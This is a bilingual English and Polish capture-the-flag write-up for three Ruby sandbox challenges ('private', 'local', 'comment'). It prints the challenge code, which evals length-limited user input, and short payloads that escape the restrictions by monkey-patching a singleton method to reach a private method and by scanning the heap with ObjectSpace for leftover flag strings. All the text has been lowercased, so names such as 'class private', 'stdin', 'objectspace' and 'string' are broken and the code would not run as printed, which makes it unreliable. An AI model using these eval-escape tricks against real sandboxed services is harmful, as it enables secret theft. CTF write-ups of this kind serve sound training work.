## private/local/comment (ppc, 50+70+100p)

###eng
[pl](#pl-version)

set of three tasks where we can execute some ruby code to steal the flag.

#### private

first task has code:

```ruby
require_relative 'restrict'
restrict.set_timeout

class private
  private
  public_methods.each do |method|
    eval "def #{method.to_s};end"
  end

  def flag
    return "twctf{censored}"
  end
end

p = private.new
private = nil

input = stdin.gets
fail unless input
input.size > 24 && input = input[0, 24]

restrict.seccomp

stdout.puts eval(input)
```

so we can provide 24 characters and we need to get the value returned by `flag` method.
we can't call the method since all methods are now private.
to solve it we use a trick - we monkey patch a new method to the instance `p` and from this method we can call also private methods so exploit is:

```ruby
def p.x;flag end;p.x
```

#### local & comment

attack for both of those was the same.

the code for local was

```ruby
require_relative 'restrict'
restrict.set_timeout

def get_flag(x)
  flag = "twctf{censored}"
  x
end

input = stdin.gets
fail unless input
input.size > 60 && input = input[0, 60]

restrict.seccomp

stdout.puts get_flag(eval(input))
```

and for comment was:

```ruby
require_relative 'restrict'
restrict.set_timeout

input = stdin.gets
fail unless input
input.size > 60 && input = input[0, 60]

require_relative 'comment_flag'
restrict.seccomp

stdout.puts eval(input)
```

```ruby
# flag is twctf{censored}
```

in both cases we searched the heap memory looking for the flag string stored in not-yet garbage collected memory using `objectspace`:

for local:
```ruby
objectspace.each_object(string){|x|x[3]=="t"and print x}
```

and for comment:
```ruby
objectspace.each_object(string){|x|x[15]=='{'and print x}
```

###pl version

zestaw 3 zadań w których możemy wykonać pewien kod ruby aby ukraść flagę.

#### private

kod do pierwszego zadania:

```ruby
require_relative 'restrict'
restrict.set_timeout

class private
  private
  public_methods.each do |method|
    eval "def #{method.to_s};end"
  end

  def flag
    return "twctf{censored}"
  end
end

p = private.new
private = nil

input = stdin.gets
fail unless input
input.size > 24 && input = input[0, 24]

restrict.seccomp

stdout.puts eval(input)
```

możemy wysłać 24 znaki żeby pobrać wynik metody `flag`.
nie możemy jej po prostu wywołać bo jest prywatna.
aby obejść nasz problem definiujemy nową metodę instancji `p` za pomocą monkey-patchingu i z tejże metody możemy wołać juz metody prywatne:

```ruby
def p.x;flag end;p.x
```

#### local & comment

atak dla obu zadań był taki sam.

kod dla local:

```ruby
require_relative 'restrict'
restrict.set_timeout

def get_flag(x)
  flag = "twctf{censored}"
  x
end

input = stdin.gets
fail unless input
input.size > 60 && input = input[0, 60]

restrict.seccomp

stdout.puts get_flag(eval(input))
```

i dla comment:

```ruby
require_relative 'restrict'
restrict.set_timeout

input = stdin.gets
fail unless input
input.size > 60 && input = input[0, 60]

require_relative 'comment_flag'
restrict.seccomp

stdout.puts eval(input)
```

```ruby
# flag is twctf{censored}
```

w obu przypadkach przeglądneliśmy stertę w poszukiwaniu stringa z flagą w jeszcze nie zwolnionej pamięci za pomocą `objectspace`:

dla local:
```ruby
objectspace.each_object(string){|x|x[3]=="t"and print x}
```

dla comment:
```ruby
objectspace.each_object(string){|x|x[15]=='{'and print x}
```
